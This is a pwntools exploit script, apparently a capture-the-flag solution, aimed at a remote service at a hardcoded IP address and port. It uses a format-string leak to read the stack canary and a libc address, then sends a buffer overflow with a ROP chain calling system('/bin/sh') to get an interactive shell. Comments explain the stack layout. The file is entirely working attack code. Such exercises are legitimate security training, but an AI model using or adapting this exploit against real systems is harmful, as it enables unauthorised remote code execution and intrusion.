from pwn import *

context.arch = 'amd64'  
HOST = '35.246.200.178'
PORT = 30693

libc = ELF('libc-2.31.so')

p = connect(HOST,PORT)

canary_offset = b'%9$p'

p.recvuntil(b'Coffee Time\n$ ')
p.sendline(canary_offset)
raspuns = p.recvline().strip().decode()

p_canary_str = raspuns[:18]
printf_addr_str = raspuns[32:]

canary = int(p_canary_str,16)
printf_addr = int(printf_addr_str,16)

print(f"Canary (int): {hex(canary)}")
print(f"Printf Addr (int): {hex(printf_addr)}")

libc.address = printf_addr - libc.symbols['printf']
print(f"Libc Base: {hex(libc.address)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"POP RDI gadget: {hex(pop_rdi)}")

bin_sh = next(libc.search(b'/bin/sh'))
print(f"'/bin/sh' address: {hex(bin_sh)}")

system_addr = libc.symbols['system']
print(f"System address: {hex(system_addr)}")

ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * 24,
    canary,
    b'B' * 8,
    ret_gadget,
    pop_rdi,
    bin_sh,
    system_addr
)
# buffer grows from lower addresses to higher addresses, unlike the stack
#  char local_28 [24];
#  long local_10;
# first fill t he buffer with 24 bytes of A, then the canary, stack alignment with ret_gadget
#next => overwrite saved rbp with 8 B's
#next => stack alignment
#next => gadget "pop next stack item into rdi"
#next => arg for rdi, the string /bin/sh
#next => the funciton to call `system`


p.recvuntil(b'Coffee Time\n$ ')
p.sendline(payload)

p.interactive()